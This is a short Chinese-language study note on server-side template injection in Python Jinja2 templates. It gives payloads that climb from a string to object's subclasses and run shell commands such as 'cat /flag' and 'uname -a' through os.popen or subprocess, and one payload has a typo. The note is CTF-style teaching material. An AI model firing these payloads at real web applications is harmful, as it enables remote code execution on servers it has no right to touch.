# SSTI 基于python的漏洞
***
大多数 Python Web 框架（如 Flask、Django、FastAPI）
都会用到模板引擎（Jinja2、Mako、Django Template 等）来把数据渲染到 HTML 上。

## 模版引擎会做的事情：

- 将模板文件（含有 =={{ ... }}、{% ... %}== 等占位符）解析成一段中间表示（AST）。

- 再把这段 AST 编译成 Python 可执行代码。

- <u>最终执行这段代码并输出字符串作为响应。</u>

而{{...}}中间的内容可能通过用户输入，那么此时如果不加以处理，可能造成任意代码执行(==RCE==)

## jinjia模版的一个例子 
> 1. 测试SSTI漏洞存在
```jinjia
{{7+7}}
```

> 2. 从字符串进入顶层基类
```jinjia
{{ ''.__class__       }}   → <class 'str'>  
{{ ''.__class__.__mro__ }}   → (<class 'str'>, <class 'object'>)  
{{ ''.__class__.__mro__[1] }} → <class 'object'>  
```

> 3. 通过遍历顶层基类object的subclasses找到Popen
```jinjia
{%for i in range(300)%}
{{i}} -> {{''.__class__.__mro__[1].__subclasses__()[i]}}
{%endfor%}
```

> 4. 利用Popen类实现==RCE==
```jinjia
{{''.__class__.__mro__[1].subclasses()[...].__init__.__globals__['os'].popen('cat /flag').read()}}
```

为什么要拿Popen？其实不一定，关键在于找到一个函数，在它初始化的那个模块里面有`import os`可以利用`__globals__`实现上面的过程。
例如**tojson、urlencode、xmlattr等等**，如何Popen不能用，就利用它们或者更多

那么除了`os`，其实`__globals__['subprocess'].check_output(['cat','/flag'])`也能实现相似的功能

__globals__[＇os＇].popen(＇uname -a＇).read()︸︸



